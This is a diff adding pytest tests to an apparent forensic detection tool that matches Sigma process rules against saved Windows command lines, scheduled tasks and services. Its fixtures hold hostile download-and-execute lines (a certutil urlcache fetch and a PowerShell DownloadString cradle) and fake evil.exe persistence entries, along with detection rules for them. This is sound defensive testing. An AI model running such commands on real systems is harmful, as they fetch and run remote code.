@@ -712,3 +712,104 @@ def test_a_snapshot_volume_takes_no_name_from_the_live_cache(tmp_path):
     assert W._dns_names(ctx) == {"10.0.0.5": "a.example.local"}
     ctx.volume = "VSS1"
     assert W._dns_names(ctx) == {}
+
+
+# ---- saved command lines as processes (v0.7.197) -----------------------------------
+
+def _cmd_rules(tmp_path):
+    custom = tmp_path / "assets" / "sigma_custom" / "windows" / "process_creation"
+    custom.mkdir(parents=True, exist_ok=True)
+    (custom / "c1.yml").write_text(_rule("Certutil Download", "process_creation", {
+        "Image|endswith": "\\certutil.exe", "CommandLine|contains": "urlcache"}),
+        encoding="utf-8")
+    (custom / "c2.yml").write_text(_rule("Web Cradle", "process_creation", {
+        "Image|endswith": "\\powershell.exe", "CommandLine|contains": "DownloadString"}),
+        encoding="utf-8")
+    (custom / "c3.yml").write_text(_rule("From PowerShell", "process_creation", {
+        "ParentImage|endswith": "\\powershell.exe", "Image|endswith": "\\whoami.exe"}),
+        encoding="utf-8")
+
+
+def test_the_saved_command_lines_run_as_processes(tmp_path):
+    # The PowerShell history, the scheduled tasks and the service ImagePaths say
+    # which command lines the host ran; the process rules read them as processes.
+    _cmd_rules(tmp_path)
+    hist = (tmp_path / "C" / "Users" / "jdoe" / "AppData" / "Roaming" / "Microsoft"
+            / "Windows" / "PowerShell" / "PSReadLine" / "ConsoleHost_history.txt")
+    hist.parent.mkdir(parents=True)
+    hist.write_text("certutil -urlcache -f http://10.0.0.5/a.txt a.exe\n"
+                    "iex (New-Object Net.WebClient).DownloadString('http://10.0.0.5/b')\n"
+                    "whoami /all\n", encoding="utf-8")
+    _write(_csvs(tmp_path) / "Persistence" / "art_tasks.csv", ["task", "runas", "command"],
+           [["\\Sync", "SYSTEM", "\"C:\\Users\\jdoe\\AppData\\evil.exe\" -x"]])
+    _write(_csvs(tmp_path) / "Registry" / "art_reg_services.csv",
+           ["KeyPath", "ValueName", "ValueData", "LastWriteTimestamp"],
+           [["ControlSet001\\Services\\Upd", "ImagePath",
+             "C:\\ProgramData\\Upd\\evil.exe -service", "2026-01-08 10:00:00"]])
+    rows = _run(tmp_path)
+    (c,) = _by(rows, "Certutil Download")
+    assert c["source"] == "powershell_history"
+    assert c["match"].startswith("Image=\\certutil.exe CommandLine=certutil -urlcache")
+    (w,) = _by(rows, "Web Cradle")          # an expression runs in powershell.exe itself
+    assert w["source"] == "powershell_history"
+    assert _by(rows, "From PowerShell")     # an external program's parent is the shell
+    sources = {r["source"] for r in _by(rows, "Evil Image")}
+    assert {"task", "service"} <= sources
+
+
+def test_a_saved_command_names_the_program_it_starts():
+    ps = W._POWERSHELL
+    assert W._image_of("Get-ChildItem C:\\x", True) == ps
+    assert W._image_of("ls", True) == ps                       # an alias
+    assert W._image_of("$a = 1", True) == ps
+    assert W._image_of("certutil.exe -decode a b", True) == "\\certutil.exe"
+    assert W._image_of("ping 10.0.0.5", True) == "\\ping.exe"
+    assert W._image_of('"C:\\Program Files\\App\\a.exe" -x', False) == \
+        "C:\\Program Files\\App\\a.exe"
+    assert W._image_of("C:\\Program Files\\App\\a.exe -x", False) == \
+        "C:\\Program Files\\App\\a.exe"
+    assert W._image_of("ls", False) == "\\ls.exe"              # not a shell: a program
+
+
+def test_a_saved_commands_leading_path_is_expanded_as_windows_runs_it():
+    # A service's ImagePath says %SystemRoot%\system32\svchost.exe; Sysmon, and the
+    # rules, see C:\Windows\system32\svchost.exe. Unexpanded, every service was a
+    # "system file outside System32".
+    e = W._expanded
+    assert e("%SystemRoot%\\system32\\svchost.exe -k x") == "C:\\Windows\\system32\\svchost.exe -k x"
+    assert e("%windir%\\system32\\wermgr.exe -upload") == "C:\\Windows\\system32\\wermgr.exe -upload"
+    assert e("\\SystemRoot\\System32\\drivers\\a.sys") == "C:\\Windows\\System32\\drivers\\a.sys"
+    assert e("system32\\DRIVERS\\b.sys") == "C:\\Windows\\system32\\DRIVERS\\b.sys"
+    assert e('"%ProgramFiles%\\A\\b.exe" -x') == '"C:\\Program Files\\A\\b.exe" -x'
+    assert e("%ProgramFiles(x86)%\\Z\\z.exe") == "C:\\Program Files (x86)\\Z\\z.exe"
+    assert e("%ProgramData%\\M\\NisSrv.exe") == "C:\\ProgramData\\M\\NisSrv.exe"
+    assert e("\\??\\C:\\x\\c.sys") == "C:\\x\\c.sys"
+    assert e("C:\\keep.exe %windir%") == "C:\\keep.exe %windir%"   # only the leading path
+
+
+def test_a_bare_name_is_found_where_windows_finds_it(tmp_path):
+    # System32 is first on the PATH: a bare rundll32 the volume's System32 holds ran
+    # from there; a name it does not hold keeps no folder; a script runs in its host.
+    sys32 = tmp_path / "Windows" / "System32"
+    sys32.mkdir(parents=True)
+    (sys32 / "rundll32.exe").write_bytes(b"MZ")
+    assert W._resolved("\\rundll32.exe", sys32) == "C:\\Windows\\System32\\rundll32.exe"
+    assert W._resolved("\\tool.exe", sys32) == "\\tool.exe"
+    assert W._resolved("\\rundll32.exe", None) == "\\rundll32.exe"
+    assert W._resolved("C:\\Windows\\system32\\a.vbs", None) == \
+        "C:\\Windows\\System32\\wscript.exe"
+    assert W._resolved("C:\\Tools\\run.cmd", None) == "C:\\Windows\\System32\\cmd.exe"
+    assert W._resolved("C:\\Tools\\a.exe", sys32) == "C:\\Tools\\a.exe"
+
+
+def test_a_bare_name_a_clean_system32_holds_resolves_without_the_file(tmp_path):
+    # A collection rarely holds System32's programs: the fork's list of a clean
+    # install's System32 names says where a bare rundll32 ran from.
+    assets = _fork_files(tmp_path)
+    (assets / "sigma_disk" / "aeng" / "system32_names.txt").write_text(
+        "# header\nrundll32.exe\n", encoding="utf-8")
+    names = W._system32_names(assets / "sigma_disk")
+    assert names == frozenset({"rundll32.exe"})
+    assert W._resolved("\\RunDll32.exe", None, names) == "C:\\Windows\\System32\\RunDll32.exe"
+    assert W._resolved("\\tool.exe", None, names) == "\\tool.exe"
+    assert W._resolved("\\powershell.exe", None, names) == W._POWERSHELL
